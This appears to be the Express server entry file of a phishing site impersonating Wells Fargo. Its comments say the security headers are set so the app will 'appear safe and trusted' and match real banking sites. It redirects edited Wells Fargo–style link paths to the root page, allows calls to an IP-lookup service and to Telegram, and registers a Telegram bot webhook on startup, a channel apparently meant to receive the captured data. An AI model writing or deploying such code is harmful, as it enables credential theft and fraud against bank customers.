import express, { type Request, Response, NextFunction } from "express";
import { registerRoutes } from "./routes";
import { serveStatic } from "./static";
import { createServer } from "http";

const app = express();
const httpServer = createServer(app);

declare module "http" {
  interface IncomingMessage {
    rawBody: unknown;
  }
}

app.use(
  express.json({
    verify: (req, _res, buf) => {
      req.rawBody = buf;
    },
  }),
);

app.use(express.urlencoded({ extended: false }));

// Security headers to make app appear safe and trusted
app.use((req, res, next) => {
  // Standard security headers - matches real banking sites
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('X-DNS-Prefetch-Control', 'on');
  res.setHeader('X-Download-Options', 'noopen');
  res.setHeader('X-Permitted-Cross-Domain-Policies', 'none');
  
  // Strict Transport Security (HSTS) - tells browsers to always use HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  
  // Content Security Policy - allows normal operation while appearing secure
  res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://ip-api.com https://api.telegram.org;");
  
  // Permissions policy - restricts dangerous features
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()');
  
  // Cache control for security
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  
  next();
});

// Redirect any URL variations to main app (handles rebranded/edited links)
app.use((req, res, next) => {
  const path = req.path.toLowerCase();
  
  // Skip static assets and Vite-related paths
  if (path.startsWith('/src') || path.startsWith('/node_modules') || path.startsWith('/@') || 
      path.includes('.js') || path.includes('.ts') || path.includes('.css') || 
      path.includes('.png') || path.includes('.ico') || path.includes('.svg') ||
      path.startsWith('/api') || path.startsWith('/assets')) {
    return next();
  }
  
  // Handle common link editing patterns - redirect to root
  if (path.includes('wellsfargo') || path.includes('wells-fargo') || path.includes('wf-')) {
    return res.redirect('/');
  }
  
  next();
});

export function log(message: string, source = "express") {
  const formattedTime = new Date().toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true,
  });

  console.log(`${formattedTime} [${source}] ${message}`);
}

app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      log(logLine);
    }
  });

  next();
});

(async () => {
  await registerRoutes(httpServer, app);

  app.use((err: any, _req: Request, res: Response, next: NextFunction) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";

    console.error("Internal Server Error:", err);

    if (res.headersSent) {
      return next(err);
    }

    return res.status(status).json({ message });
  });

  // importantly only setup vite in development and after
  // setting up all the other routes so the catch-all route
  // doesn't interfere with the other routes
  if (process.env.NODE_ENV === "production") {
    serveStatic(app);
  } else {
    const { setupVite } = await import("./vite");
    await setupVite(httpServer, app);
  }

  // ALWAYS serve the app on the port specified in the environment variable PORT
  // Other ports are firewalled. Default to 5000 if not specified.
  // this serves both the API and the client.
  // It is the only port that is not firewalled.
  const port = parseInt(process.env.PORT || "5000", 10);
  httpServer.listen(
    {
      port,
      host: "0.0.0.0",
      reusePort: true,
    },
    async () => {
      log(`serving on port ${port}`);

      // Auto-register bot commands and webhook on startup
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const domain = process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_DOMAINS?.split(",")[0];
      if (botToken && domain) {
        try {
          const webhookUrl = `https://${domain}/api/telegram/webhook`;
          const whRes = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ url: webhookUrl, allowed_updates: ["message", "callback_query"] }),
          });
          const whData = await whRes.json() as { ok: boolean };
          if (whData.ok) log(`Telegram webhook registered: ${webhookUrl}`);
          else log(`Telegram webhook failed: ${JSON.stringify(whData)}`);

          // Register bot commands
          await fetch(`https://api.telegram.org/bot${botToken}/setMyCommands`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              commands: [
                { command: "start", description: "Open the notification menu" },
                { command: "status", description: "Check your subscription status" },
                { command: "stop", description: "Unsubscribe from notifications" },
              ],
            }),
          });
          log("Telegram bot commands registered");
        } catch (e) {
          log(`Telegram setup error: ${e}`);
        }
      }
    },
  );
})();
